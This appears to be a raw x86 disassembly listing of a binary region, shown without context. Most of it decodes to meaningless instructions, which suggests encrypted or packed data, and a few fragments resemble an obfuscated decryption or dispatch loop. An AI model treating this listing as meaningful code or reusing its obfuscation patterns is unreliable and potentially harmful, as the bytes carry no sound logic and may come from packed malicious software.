  40b810:	rol    DWORD PTR [eax+0x36c98c49],cl
  40b816:	inc    ecx
  40b817:	sub    al,al
  40b819:	in     al,0x8b
  40b81b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b81c:	test   al,0x2f
  40b81e:	sub    BYTE PTR [edx-0x3c49f05d],dh
  40b824:	cdq    
  40b825:	mov    ds:0x92765920,eax
  40b82a:	dec    edx
  40b82b:	ins    BYTE PTR es:[edi],dx
  40b82c:	push   es
  40b82d:	daa    
  40b82e:	adc    al,dl
  40b830:	dec    eax
  40b831:	sar    edx,0xe9
  40b834:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b835:	arpl   WORD PTR [eax+0x74],bx
  40b838:	or     al,0x3e
  40b83a:	adc    BYTE PTR [ecx],bh
  40b83c:	out    dx,eax
  40b83d:	mov    ebp,0xb658ce96
  40b842:	or     eax,0xd7aac635
  40b847:	sbb    edi,ecx
  40b849:	dec    eax
  40b84a:	mov    ch,0xc3
  40b84c:	pop    ebx
  40b84d:	imul   eax,DWORD PTR [esi],0xee4e116a
  40b853:	add    eax,0xde851197
  40b858:	pop    edx
  40b859:	aaa    
  40b85a:	adc    ebx,DWORD PTR [ebp-0x152a05be]
  40b860:	or     al,0xbc
  40b862:	daa    
  40b863:	jg     0x40b88c
  40b865:	inc    eax
  40b866:	push   cs
  40b867:	mov    WORD PTR [edi],?
  40b869:	mov    ds:0xf36bbdcb,eax
  40b86e:	and    DWORD PTR [ecx+0x9beefc5],ebp
  40b874:	bound  esp,QWORD PTR [eax+0x1c]
  40b877:	cdq    
  40b878:	pop    esp
  40b879:	push   ebx
  40b87a:	add    BYTE PTR [eax-0x3e44182a],0x83
  40b881:	inc    edx
  40b882:	push   ds
  40b883:	test   al,0xc5
  40b885:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b886:	xchg   esp,eax
  40b887:	add    eax,0x8d49adf8
  40b88c:	dec    ebx
  40b88d:	dec    ebp
  40b88e:	cmp    eax,0xcb142bf
  40b893:	pop    esp
  40b894:	add    ah,BYTE PTR [edx]
  40b896:	adc    DWORD PTR [ecx-0x70c451c2],esi
  40b89c:	pop    edx
  40b89d:	jle    0x40b8d0
  40b89f:	imul   esi,DWORD PTR [edx+ebx*2],0xffffffad
  40b8a3:	sub    esp,ecx
  40b8a5:	mov    al,ds:0x33a876ac
  40b8aa:	push   edi
  40b8ab:	and    eax,0x714aeeed
  40b8b0:	loop   0x40b86f
  40b8b2:	test   eax,0x981b6cb2
  40b8b7:	mov    esi,0x967a0481
  40b8bc:	and    al,0xdf
  40b8be:	xor    BYTE PTR [ebx+eax*4-0x65],0x39
  40b8c3:	or     DWORD PTR [eax],0x69a0e3c3
  40b8c9:	rcr    DWORD PTR [eax+0x48cd8d9a],0xb9
  40b8d0:	dec    ebx
  40b8d1:	stos   BYTE PTR es:[edi],al
  40b8d2:	mov    ah,0xe3
  40b8d4:	xchg   ebx,eax
  40b8d5:	push   edx
  40b8d6:	shl    BYTE PTR [ebp-0x1],cl
  40b8d9:	push   ss
  40b8da:	scas   al,BYTE PTR es:[edi]
  40b8db:	xchg   ecx,eax
  40b8dc:	test   BYTE PTR [esi-0x45],0xe
  40b8e0:	je     0x40b921
  40b8e2:	dec    edi
  40b8e3:	cli    
  40b8e4:	sub    bh,BYTE PTR [ebx]
  40b8e6:	sub    ah,dh
  40b8e8:	stc    
  40b8e9:	add    DWORD PTR [eax],edi
  40b8eb:	xor    al,0x4e
  40b8ed:	bound  edx,QWORD PTR [edx-0x2e]
  40b8f0:	xchg   edx,eax
  40b8f1:	pusha  
  40b8f2:	cmp    ebp,DWORD PTR [ecx+esi*1-0x7aac46fb]
  40b8f9:	push   eax
  40b8fa:	call   0xbbf874e6
  40b8ff:	pushf  
  40b900:	retf   
  40b901:	mov    esi,0xc58ce07c
  40b906:	std    
  40b907:	in     al,0xd0
  40b909:	mov    DWORD PTR [edi+edi*4],edx
  40b90c:	adc    BYTE PTR [ecx+0x5d],ah
  40b90f:	adc    eax,0xc4d23a93
  40b914:	cmp    eax,0x7b31a8c6
  40b919:	je     0x40bc46
  40b91f:	mov    eax,DWORD PTR [ebp-0x10]
  40b922:	and    DWORD PTR [eax],0x751c80
  40b928:	jmp    0x40b5e7
  40b92d:	jmp    0x40bc46
  40b932:	into   
  40b933:	aas    
  40b934:	ds ror ebp,0xc1
  40b938:	rcl    ebx,1
  40b93a:	add    esi,DWORD PTR [edi]
  40b93c:	stos   DWORD PTR es:[edi],eax
  40b93d:	shr    DWORD PTR [esi+ebx*8-0x61],cl
  40b941:	out    0xc6,al
  40b943:	mov    WORD PTR [eax+0x78],?
  40b946:	je     0x40b9c6
  40b948:	js     0x40b9c2
  40b94a:	int    0xe7
  40b94c:	fadd   QWORD PTR [eax]
  40b94e:	mov    ebp,0xab7fdec1
  40b953:	or     al,0xb0
  40b955:	sbb    al,0xee
  40b957:	dec    ebp
  40b958:	pop    ss
  40b959:	lock sub edx,DWORD PTR [ebx]
  40b95c:	aas    
  40b95d:	add    DWORD PTR [edx],eax
  40b95f:	sub    al,0x8c
  40b961:	call   0x5bb3:0xbf4330ee
  40b968:	test   eax,0xa3f0cc1e
  40b96d:	cwde   
  40b96e:	xor    al,0x81
  40b970:	not    BYTE PTR [edi+0x54]
  40b973:	or     BYTE PTR [ecx-0x12],dl
  40b976:	or     BYTE PTR [eax+0x49],cl
  40b979:	or     al,0xb8
  40b97b:	lods   eax,DWORD PTR ds:[esi]
  40b97c:	xor    DWORD PTR [ebx],ebx
  40b97e:	mov    ch,0x46
  40b980:	and    eax,0x88d91791
  40b985:	jno    0x40b961
  40b987:	(bad)  
  40b989:	xchg   DWORD PTR [edx],ecx
  40b98b:	inc    eax
  40b98c:	sbb    bh,BYTE PTR [esi+0x74a237ba]
  40b992:	mov    ah,0xdf
  40b994:	dec    edx
  40b995:	mov    ds:0xce19a229,eax
  40b99a:	xchg   esi,eax
  40b99b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b99c:	(bad)  
  40b99d:	daa    
  40b99e:	pushf  
  40b99f:	js     0x40ba14
  40b9a1:	cmp    al,0x9c
  40b9a3:	pop    eax
  40b9a4:	sub    al,0xe3
  40b9a6:	sbb    dh,dh
  40b9a8:	into   
  40b9a9:	add    eax,0x223bb954
  40b9ae:	fsub   QWORD PTR [esp+ebx*2]
  40b9b1:	das    
  40b9b2:	idiv   BYTE PTR [ebx+0x19f7f76a]
  40b9b8:	mov    dh,0xf4
  40b9ba:	stc    
  40b9bb:	pop    ebp
  40b9bc:	xor    eax,0x95023530
  40b9c1:	(bad)  [ebp+0x3ab7558d]
  40b9c7:	jmp    0xb52d:0x133b5171
  40b9ce:	mov    ebx,0xca5ca2d0
  40b9d3:	jp     0x40ba45
  40b9d5:	aas    
  40b9d6:	das    
  40b9d7:	(bad)  
  40b9d8:	mov    cl,0x6a
  40b9da:	mov    eax,ds:0x321cfbe0
  40b9df:	enter  0xd636,0x9c
  40b9e3:	dec    esi
  40b9e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9e5:	mov    edx,0xea0e4a
  40b9ea:	sahf   
  40b9eb:	aad    0x14
  40b9ed:	xchg   esi,eax
  40b9ee:	and    edi,esi
  40b9f0:	cmp    DWORD PTR fs:[ebp-0x5e],edi
  40b9f4:	sub    DWORD PTR [ebp+0x5d],esp
  40b9f7:	(bad)  
  40b9f9:	pop    ds
  40b9fa:	loope  0x40b9c3
  40b9fc:	adc    eax,DWORD PTR [esi+esi*4-0x14]
  40ba00:	push   edx
  40ba01:	aaa    
  40ba02:	test   eax,0x3ccad0c8
  40ba07:	outs   dx,DWORD PTR ds:[esi]
  40ba08:	scas   al,BYTE PTR es:[edi]
  40ba09:	ins    BYTE PTR es:[edi],dx
  40ba0a:	dec    edi
  40ba0b:	jl     0x40b992
  40ba0d:	jb     0x40ba32
  40ba0f:	loope  0x40b9f9
  40ba11:	pop    esp
  40ba12:	xchg   ebp,eax
  40ba13:	inc    esi
  40ba14:	add    al,0x5b
  40ba16:	es adc esi,ebx
  40ba19:	mov    ebp,0xb7c0dc74
  40ba1e:	inc    edi
  40ba1f:	push   ebx
  40ba20:	fdivr  DWORD PTR [esi]
  40ba22:	lahf   
  40ba23:	pop    ebx
  40ba24:	sub    BYTE PTR [edx-0x6d],ch
  40ba27:	stc    
  40ba28:	int3   
  40ba29:	stos   DWORD PTR es:[edi],eax
  40ba2a:	and    eax,0x2433554b
  40ba2f:	sbb    ch,dh
  40ba31:	xor    cl,BYTE PTR [edx+0x3340c23]
  40ba37:	add    eax,0x36c987f
  40ba3c:	out    0x18,al
  40ba3e:	sub    al,BYTE PTR ds:0xf4e76889
  40ba44:	mov    es,WORD PTR [ecx]
  40ba46:	fsub   QWORD PTR [ebp-0x6f]
  40ba49:	push   0x74
  40ba4b:	or     al,0x26
  40ba4d:	ss sbb eax,0xad16ec57
  40ba53:	bound  edx,QWORD PTR [ebx+0x2288e27]
  40ba59:	scas   eax,DWORD PTR es:[edi]
  40ba5a:	outs   dx,DWORD PTR ds:[esi]
  40ba5b:	inc    ebx
  40ba5c:	(bad)  
  40ba5d:	xchg   esp,eax
  40ba5e:	inc    eax
  40ba5f:	(bad)  
  40ba60:	cmp    ecx,ebp
  40ba62:	lods   al,BYTE PTR ds:[esi]
  40ba63:	wbinvd 
  40ba65:	mov    ebp,0x6e588900
  40ba6a:	adc    al,0x6
  40ba6c:	adc    ecx,eax
  40ba6e:	retf   0x670e
  40ba71:	pop    esp
  40ba72:	sub    al,0x67
  40ba74:	aas    
  40ba75:	xlat   BYTE PTR ds:[ebx]
  40ba76:	sbb    eax,DWORD PTR [ebx+0x70]
  40ba79:	sub    BYTE PTR [esi+0x25],bl
  40ba7c:	xchg   ecx,eax
  40ba7d:	mov    cl,BYTE PTR [ebx-0x5d23b42b]
  40ba83:	scas   eax,DWORD PTR es:[edi]
  40ba84:	inc    edi
  40ba85:	fild   WORD PTR [edx-0x1de016f1]
  40ba8b:	outs   dx,BYTE PTR ds:[esi]
  40ba8c:	jns    0x40ba76
  40ba8e:	nop
  40ba8f:	out    0x54,al
  40ba91:	inc    ebp
  40ba92:	add    DWORD PTR [edx],edi
  40ba94:	icebp  
  40ba95:	loop   0x40bb08
  40ba97:	inc    eax
  40ba99:	out    dx,eax
  40ba9a:	push   cs
  40ba9b:	push   esi
  40ba9c:	repz push esi
  40ba9e:	les    ecx,FWORD PTR [eax+ebp*4-0xb]
  40baa2:	or     esp,ecx
  40baa4:	sub    BYTE PTR [ebp+0x54],ch
  40baa7:	or     al,0x27
  40baa9:	lods   al,BYTE PTR ds:[esi]
  40baaa:	fstp   DWORD PTR [ebx-0x5fb4a037]
  40bab0:	mov    ebp,0x5c3f9f95
  40bab5:	cmp    edi,esi
  40bab7:	arpl   WORD PTR fs:[ecx],dx
  40baba:	and    BYTE PTR [esi+0x13],al
  40babd:	out    0x28,eax
  40babf:	xchg   ebx,eax
  40bac0:	pop    esp
  40bac1:	adc    al,0xa7
  40bac3:	fsub   DWORD PTR [esi-0x74]
  40bac6:	or     BYTE PTR [eax+0x22ba7927],bl
  40bacc:	and    eax,0x64b8c2cb
  40bad1:	iret   
  40bad2:	sbb    eax,0x1d092a3
  40bad7:	mov    eax,es
  40bad9:	fdiv   DWORD PTR [eax]
  40badb:	jno    0x40bad6
  40badd:	and    BYTE PTR [edi-0x2d],bl
  40bae0:	inc    esi
  40bae1:	bound  edi,QWORD PTR [ebx-0x3ce294f6]
  40bae7:	pop    esp
  40bae8:	jmp    0xeeabf845
  40baed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40baee:	mov    edi,0x64e1bcd4
  40baf3:	xlat   BYTE PTR ds:[ebx]
  40baf4:	sti    
  40baf5:	mov    ds:0xb7d1bdd4,eax
  40bafa:	ret    
  40bafb:	xor    eax,0xdb279af0
  40bb00:	aam    0x16
  40bb02:	push   edx
  40bb03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb04:	inc    DWORD PTR [edi-0x49525a6a]
  40bb0a:	and    BYTE PTR [esi-0x9],al
  40bb0d:	sar    BYTE PTR [ebx-0xa],1
  40bb10:	dec    eax
  40bb11:	loope  0x40bab1
  40bb13:	inc    ebp
  40bb14:	call   0x969e069e
  40bb19:	sbb    BYTE PTR [edx-0x52657a56],0xaa
  40bb20:	imul   ebp,DWORD PTR [edi-0x32],0xffffffe7
  40bb24:	push   ebx
  40bb25:	lods   al,BYTE PTR ds:[esi]
  40bb26:	shl    DWORD PTR [ebp+0x377c28e7],cl
  40bb2c:	fwait
  40bb2d:	pop    edx
  40bb2e:	cmp    eax,0x1cff9f51
  40bb33:	xlat   BYTE PTR ds:[ebx]
  40bb34:	adc    BYTE PTR [ecx+0x53],0x7c
  40bb38:	fwait
  40bb39:	sbb    edi,DWORD PTR [esi-0x5376054d]
  40bb3f:	xlat   BYTE PTR ds:[ebx]
  40bb40:	pop    edx
  40bb41:	add    al,0x77
  40bb43:	inc    eax
  40bb44:	xor    eax,0x936d9128
  40bb49:	(bad)  
  40bb4a:	mov    ds,edx
  40bb4c:	mov    al,ds:0xd74f21b7
  40bb51:	std    
  40bb52:	mov    edx,0xc78f08a0
  40bb57:	and    BYTE PTR [edx],0xf8
  40bb5a:	adc    eax,0xa7d9f610
  40bb5f:	sub    ch,BYTE PTR [ebx+eiz*2]
  40bb62:	cli    
  40bb63:	ins    DWORD PTR es:[edi],dx
  40bb64:	add    ecx,esp
  40bb66:	icebp  
  40bb67:	sbb    eax,0x6faf0d92
  40bb6c:	jmp    0x9fc970e6
  40bb71:	pop    ebp
  40bb72:	mov    eax,0xd5aa04e5
  40bb77:	dec    esp
  40bb78:	xor    ah,0x2f
  40bb7b:	pop    esp
  40bb7c:	or     bl,BYTE PTR [edi+0x15]
  40bb7f:	iret   
  40bb80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb81:	lahf   
  40bb82:	outs   dx,BYTE PTR ds:[esi]
  40bb83:	inc    ebx
  40bb84:	ret    0xf640
  40bb87:	sub    BYTE PTR [esi],bl
  40bb89:	icebp  
  40bb8a:	push   ebx
  40bb8b:	cmc    
  40bb8c:	ret    0xc5e4
  40bb8f:	inc    ecx
  40bb90:	ror    BYTE PTR [esi+edx*4],1
  40bb93:	ret    
  40bb94:	fimul  WORD PTR [esi-0x3e7b946e]
  40bb9a:	and    al,0x2b
  40bb9c:	mov    ebx,0x1d8c7ed5
  40bba1:	dec    edi
  40bba2:	xchg   edi,esp
  40bba4:	xchg   ecx,eax
  40bba5:	and    al,dl
  40bba7:	xchg   esp,eax
  40bba8:	jno    0x40bbaf
  40bbaa:	imul   esi,ebx,0x99ddf0f2
  40bbb0:	rcl    DWORD PTR [ecx],cl
  40bbb2:	mov    ds:0x1b995cf4,al
  40bbb7:	jns    0x40bb39
  40bbb9:	fwait
  40bbba:	out    dx,eax
  40bbbb:	sub    al,0xed
  40bbbd:	mov    ah,0x9f
  40bbbf:	ss cmp eax,0x65319246
  40bbc5:	or     BYTE PTR [eax],dh
  40bbc7:	cmp    eax,0xe10f8af6
  40bbcc:	or     ebp,DWORD PTR [edi+0x37827126]
  40bbd2:	mov    cl,0x7c
  40bbd4:	test   DWORD PTR [edx+0xbc50913],edi
  40bbda:	(bad)  
  40bbdb:	arpl   WORD PTR [ebx],bp
  40bbdd:	inc    ebp
  40bbde:	push   eax
  40bbdf:	add    eax,0xae693024
  40bbe4:	xor    bl,BYTE PTR [ebx-0x55536817]
  40bbea:	xchg   ebx,eax
  40bbeb:	jl     0x40bbb0
  40bbed:	ja     0x40bbd7
  40bbef:	mov    ch,0x63
  40bbf1:	shr    DWORD PTR [ebp+edi*1+0x330abf0e],cl
  40bbf8:	inc    BYTE PTR [ecx]
  40bbfa:	mov    al,0x4
  40bbfc:	mov    ?,ecx
  40bbfe:	dec    edi
  40bbff:	mov    DWORD PTR [esi],ecx
  40bc01:	rol    ecx,1
  40bc03:	sbb    BYTE PTR [edi+0x40cefd5],cl
  40bc09:	sti    
  40bc0a:	loope  0x40bbc9
  40bc0c:	mov    ds:0x55d03005,al
  40bc11:	add    ebx,DWORD PTR [esi+eiz*8-0x57ea78ff]
  40bc18:	dec    edx
  40bc19:	xor    BYTE PTR [ecx],dl
  40bc1b:	pop    esp
  40bc1c:	cmp    eax,0xedd81329
  40bc21:	xor    ah,BYTE PTR [eax-0x3c]
  40bc24:	sbb    BYTE PTR [ebx-0x5c6b504f],al
  40bc2a:	mov    bl,0xa9
  40bc2c:	scas   al,BYTE PTR es:[edi]
  40bc2d:	inc    eax
  40bc2e:	mov    edx,0x7e38eca
  40bc33:	rcl    ah,cl
  40bc35:	dec    ebx
  40bc36:	mov    bh,BYTE PTR [eax]
  40bc38:	dec    ecx
  40bc39:	mov    ecx,0xe22488d6
  40bc3e:	int3   
  40bc3f:	mov    eax,DWORD PTR [ebx-0x32951930]
  40bc45:	add    BYTE PTR [ebx+0x558bf445],cl
  40bc4b:	call   0x767e7e5b
  40bc50:	jle    0x40bbf1
  40bc52:	cli    
  40bc53:	je     0x40bc67
  40bc59:	mov    eax,DWORD PTR [ebp-0x10]
  40bc5c:	xor    DWORD PTR [eax],0x2650fa8e
  40bc62:	jmp    0x40b5e7
  40bc67:	mov    ax,WORD PTR [ebp-0x4]
  40bc6b:	jmp    0x40bf84
  40bc70:	(bad)  
  40bc71:	ds ret 
  40bc73:	ror    bl,cl
  40bc75:	rcl    ebp,1
  40bc77:	fisubr DWORD PTR [ebp+0x56]
  40bc7a:	xchg   esp,eax
  40bc7b:	jge    0x40bc28
  40bc7d:	rcr    DWORD PTR [edi-0x1f],cl
  40bc80:	ret    0x7891
  40bc83:	js     0x40bcf9
  40bc85:	jle    0x40bcff
  40bc87:	js     0x40bc53
  40bc89:	cmp    ebp,DWORD PTR [eax+0x33b00809]
  40bc8f:	mov    ch,0x2d
  40bc91:	pop    esp
  40bc92:	int3   
  40bc93:	daa    
  40bc94:	mov    ebx,0xfe88f1d5
  40bc99:	add    eax,0xe47a7d49
  40bc9e:	pop    edx
  40bc9f:	pop    ss
  40bca0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bca1:	jne    0x40bcd8
  40bca3:	adc    al,0xcd
  40bca5:	out    0xb,eax
  40bca7:	push   eax
  40bca8:	push   0x67
  40bcaa:	loop   0x40bd16
  40bcac:	or     BYTE PTR [edx+0x3e],dl
  40bcaf:	cmp    ch,bh
  40bcb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcb2:	sub    edi,edx
  40bcb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcb5:	fisttp WORD PTR [eax-0x33]
  40bcb8:	lahf   
  40bcb9:	add    eax,0xff6e4221
  40bcbe:	lahf   
  40bcbf:	mov    DWORD PTR [edi+0x54c26b8e],ecx
  40bcc5:	add    dh,0xd3
  40bcc8:	fisubr DWORD PTR es:[eax+0x23f21183]
  40bccf:	push   edi
  40bcd0:	dec    edx
  40bcd1:	xchg   esp,eax
  40bcd2:	jbe    0x40bc72
  40bcd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcd5:	fdivr  DWORD PTR [eax]
  40bcd7:	sub    ah,BYTE PTR [esi+0x77]
  40bcda:	xlat   BYTE PTR ds:[ebx]
  40bcdb:	cmp    eax,0xe41bdc5f
  40bce0:	call   0x3c40:0xbf2e2b87
  40bce7:	fisttp QWORD PTR [edx+0x4d]
  40bcea:	xor    ecx,DWORD PTR [eax+0x67c79b76]
  40bcf0:	hlt    
  40bcf1:	xor    BYTE PTR ds:0xdc0fd2e6,0xf4
  40bcf8:	idiv   DWORD PTR [edx]
  40bcfa:	pop    ebx
  40bcfb:	jle    0x40bcab
  40bcfd:	(bad)  
  40bcff:	sahf   
  40bd00:	es sbb al,0xf
  40bd03:	clc    
  40bd04:	sub    al,BYTE PTR [edx-0x39]
  40bd07:	push   ss
  40bd08:	fstp   QWORD PTR [eax-0x7]
  40bd0b:	jb     0x40bcfe
  40bd0d:	push   ecx
  40bd0e:	xchg   ebp,eax
  40bd0f:	cdq    
  40bd10:	mov    ah,0x75
  40bd12:	mov    esi,esp
  40bd14:	cmp    cl,BYTE PTR ds:0x7cae30e4
  40bd1a:	aaa    
  40bd1b:	in     al,0x21
  40bd1d:	test   ch,0xd4
  40bd20:	fwait
  40bd21:	pop    esp
  40bd22:	jp     0x40bcbe
  40bd24:	icebp  
  40bd25:	gs push edi
  40bd27:	lds    ebp,FWORD PTR [eax]
  40bd29:	sar    BYTE PTR [ebp+0x2],1
  40bd2c:	adc    BYTE PTR [ebx-0x6c],dh
  40bd2f:	fbstp  TBYTE PTR [esi]
  40bd31:	iret   
  40bd32:	push   ebx
  40bd33:	xchg   edx,eax
  40bd34:	xchg   esi,eax
  40bd35:	mov    edi,eax
  40bd37:	mov    ebp,0xc273e24
  40bd3c:	dec    esp
  40bd3d:	mov    edi,0xe0124598
  40bd42:	or     al,0xc7
  40bd44:	dec    esp
  40bd45:	inc    ebx
  40bd46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd47:	mov    bh,0x4b
  40bd49:	outs   dx,BYTE PTR ds:[esi]
  40bd4a:	ja     0x40bd58
  40bd4c:	test   eax,0x8b8bb634
  40bd51:	mov    ds:0x467dc8e,eax
  40bd56:	sbb    BYTE PTR [ebx],dl
  40bd58:	lds    eax,FWORD PTR [eax]
  40bd5a:	jno    0x40bd48
  40bd5c:	inc    ebx
  40bd5d:	repz pop ss
  40bd5f:	dec    edx
  40bd60:	xchg   ecx,eax
  40bd61:	add    DWORD PTR [edx-0x7],ecx
  40bd64:	out    dx,al
  40bd65:	mov    ds:0x995768ff,al
  40bd6a:	dec    edi
  40bd6b:	push   esi
  40bd6c:	mul    DWORD PTR [ebx+0x1d89e9f8]
  40bd72:	xchg   ebp,eax
  40bd73:	(bad)  [esi+edx*8]
  40bd76:	lahf   
  40bd77:	sub    al,0xfa
  40bd79:	and    bl,BYTE PTR [ebx]
  40bd7b:	mov    ebx,0xeb02e170
  40bd80:	ins    DWORD PTR es:[edi],dx
  40bd81:	ret    
  40bd82:	pusha  
  40bd83:	xor    ebp,esp
  40bd85:	push   0x2
  40bd87:	sar    BYTE PTR [ebp+eax*2+0x1b9014c6],cl
  40bd8e:	mov    eax,ds:0xcad754ae
  40bd93:	test   BYTE PTR [eax],0x38
  40bd96:	or     DWORD PTR [ecx],ebp
  40bd98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd99:	mov    esp,0x2d20f8a3
  40bd9e:	cli    
  40bd9f:	jno    0x40bd9a
  40bda1:	add    dh,ch
  40bda3:	scas   eax,DWORD PTR es:[edi]
  40bda4:	clc    
  40bda5:	lods   eax,DWORD PTR ds:[esi]
  40bda6:	aad    0xb6
  40bda8:	xchg   ecx,eax
  40bda9:	push   cs
  40bdaa:	aam    0x50
  40bdac:	cmp    edi,DWORD PTR [eax+eax*2]
  40bdaf:	addr16 xchg esp,eax
  40bdb1:	test   BYTE PTR [esi-0x2e33243b],dh
  40bdb7:	rcr    BYTE PTR [ecx+esi*8-0x63],0xdf
  40bdbc:	mov    ch,0x82
  40bdbe:	jne    0x40bddf
  40bdc0:	inc    esi
  40bdc1:	mov    al,ds:0xf4ffdea9
  40bdc6:	fisttp WORD PTR [edi-0x452149f5]
  40bdcc:	jo     0x40bd9f
  40bdce:	mov    ch,0xa9
  40bdd0:	retf   0x4c80
  40bdd3:	rol    al,0x1d
  40bdd6:	(bad)  
  40bdd7:	lea    ebp,[esi+0xf]
  40bdda:	(bad)  
  40bddc:	cmp    BYTE PTR [ecx-0x14],ah
  40bddf:	jmp    0x594032d9
  40bde4:	retf   0x356
  40bde7:	sub    al,0x38
  40bde9:	dec    edi
  40bdea:	jg     0x40be62
  40bdec:	retf   
  40bded:	hlt    
  40bdee:	call   0x95798f1b
  40bdf3:	inc    esp
  40bdf4:	(bad)  
  40bdf5:	or     eax,0xc40de21
  40bdfa:	cld    
  40bdfb:	and    DWORD PTR [ecx],edi
  40bdfd:	push   es
  40bdfe:	in     al,dx
  40bdff:	push   ebp
  40be00:	xor    al,0x8e
  40be02:	mov    ebx,0xa579681c
  40be07:	jg     0x40be88
  40be09:	and    al,0xb3
  40be0b:	jnp    0x40bdea
  40be0d:	inc    esp
  40be0e:	aas    
  40be0f:	jne    0x40be78
  40be11:	in     al,dx
  40be12:	mov    ebp,0x9394c942
  40be17:	lods   al,BYTE PTR ds:[esi]
  40be18:	ds pushf 
  40be1a:	jmp    ebx
  40be1c:	push   0x1e6f8750
  40be21:	jl     0x40be2f
  40be23:	test   al,0x54
  40be25:	ja     0x40be43
  40be27:	add    dl,BYTE PTR [esi+0x112d161a]
  40be2d:	or     eax,0xbb8d68e
  40be32:	(bad)  
  40be34:	stc    
  40be35:	js     0x40bdb8
  40be37:	push   ebx
  40be38:	or     esp,DWORD PTR [edx+0xa17548]
  40be3e:	(bad)  
  40be3f:	cld    
  40be40:	mov    BYTE PTR [ebp+0x3f906888],bh
  40be46:	add    al,0xc2
  40be48:	mov    esi,0x7282d201
  40be4d:	push   edi
  40be4e:	adc    BYTE PTR [edx+0x1a],0xa8
  40be52:	pop    ds
  40be53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be54:	or     DWORD PTR [ebp-0x12d9ff70],0xe4472049
  40be5e:	jno    0x40bec7
  40be60:	retf   0x4c01
  40be63:	pop    esp
  40be64:	dec    eax
  40be65:	dec    ebp
  40be66:	lds    ecx,FWORD PTR [ebp+0x58dd7fe2]
  40be6c:	lea    edx,[esi+edi*8-0x5e]
  40be70:	mov    eax,es:0xf6f2ffff
  40be76:	mov    DWORD PTR [ecx+esi*4+0x29],edx
  40be7a:	jecxz  0x40be1e
  40be7c:	dec    ebp
  40be7d:	jl     0x40bead
  40be7f:	and    BYTE PTR [ebx+eiz*1+0x37],al
  40be83:	mov    ebp,0xd3ccbfb6
  40be88:	inc    edi
  40be89:	and    al,0xa9
  40be8b:	mov    ds:0x28977604,eax
  40be90:	rol    DWORD PTR [edx-0x16],cl
  40be93:	add    esp,DWORD PTR [ebx+0x3ca0be30]
  40be99:	mov    eax,?
  40be9b:	call   0xed8f:0x574cb159
  40bea2:	xor    dl,BYTE PTR [eax-0x372619f]
  40bea8:	stc    
  40bea9:	cdq    
  40beaa:	aad    0x48
  40beac:	jbe    0x40be55
  40beae:	mov    ebx,0x363db38e
  40beb3:	jnp    0x40be99
  40beb5:	js     0x40bf34
  40beb7:	rcl    DWORD PTR [edi+edi*8+0x56],1
  40bebb:	mov    eax,ds:0x6ef00696
  40bec0:	sub    ebp,0xf6de92b3
  40bec6:	xor    esp,DWORD PTR [eax+0x6bf31602]
  40becc:	sub    esp,eax
  40bece:	push   ds
  40becf:	jbe    0x40beaf
  40bed1:	and    BYTE PTR [ebp+0x31],cl
  40bed4:	sbb    al,0xc3
  40bed6:	pop    ss
  40bed7:	pop    edi
  40bed8:	dec    esi
  40bed9:	ret    0xed6b
  40bedc:	aad    0x6d
  40bede:	sub    DWORD PTR [eax+0x10],0xffffffad
  40bee2:	int3   
  40bee3:	(bad)  
  40bee5:	xchg   esp,eax
  40bee6:	pop    ss
  40bee7:	or     eax,0xdebeef75
  40beec:	mov    edx,0x2724ca83
  40bef1:	jecxz  0x40bf48
  40bef3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bef4:	xchg   ebp,eax
  40bef5:	push   esi
  40bef6:	or     DWORD PTR [eax-0x5f],0x1860354e
  40befd:	xlat   BYTE PTR ds:[ebx]
  40befe:	out    dx,al
  40beff:	and    BYTE PTR [edx+0x778d4e3e],al
  40bf05:	mov    WORD PTR [edx],ds
  40bf07:	inc    ecx
  40bf08:	add    dh,ch
  40bf0a:	adc    al,0x86
  40bf0c:	sub    dh,BYTE PTR [eax-0x67]
  40bf0f:	push   eax
  40bf10:	(bad)  
  40bf11:	jbe    0x40bf49
  40bf13:	pop    ds
  40bf14:	pop    ds
  40bf15:	ds sti 
  40bf17:	ret    0xd834
  40bf1a:	neg    BYTE PTR [ebp-0x3e]
  40bf1d:	daa    
  40bf1e:	jbe    0x40bf7e
  40bf20:	mov    ds:0x6d7d133c,eax
  40bf25:	xchg   ebp,eax
  40bf26:	(bad)  
  40bf27:	fild   DWORD PTR [edx]
  40bf29:	int3   
  40bf2a:	adc    eax,0x3789274
  40bf2f:	xor    DWORD PTR [ebx+0x1f],ebp
  40bf32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf33:	imul   edx,DWORD PTR [ecx-0x4eb433f7],0xd4fe929e
  40bf3d:	pop    ebp
  40bf3e:	cmc    
  40bf3f:	jmp    0x7e656674
  40bf44:	loopne 0x40bf53
  40bf46:	out    0x3f,eax
  40bf48:	xchg   edx,eax
  40bf49:	mov    esp,0x2957b20c
  40bf4e:	aam    0x9b
  40bf50:	in     eax,0xbb
  40bf52:	cmc    
  40bf53:	mov    bh,0xe6
  40bf55:	(bad)  
  40bf56:	pop    ecx
  40bf57:	pop    esp
  40bf58:	mov    ecx,0x5c38529c
  40bf5d:	jge    0x40bee7
  40bf5f:	cmc    
  40bf60:	scas   eax,DWORD PTR es:[edi]
  40bf61:	les    edi,FWORD PTR ds:0x8c776ae2
  40bf67:	cli    
  40bf68:	pop    es
  40bf69:	mov    eax,0x2b55b078
  40bf6e:	jae    0x40bf88
  40bf70:	fwait
  40bf71:	rcr    BYTE PTR [eax+0x466f921a],1
  40bf77:	mov    ah,0x94
  40bf79:	mov    ds:0xf5adef4d,eax
  40bf7e:	sahf   
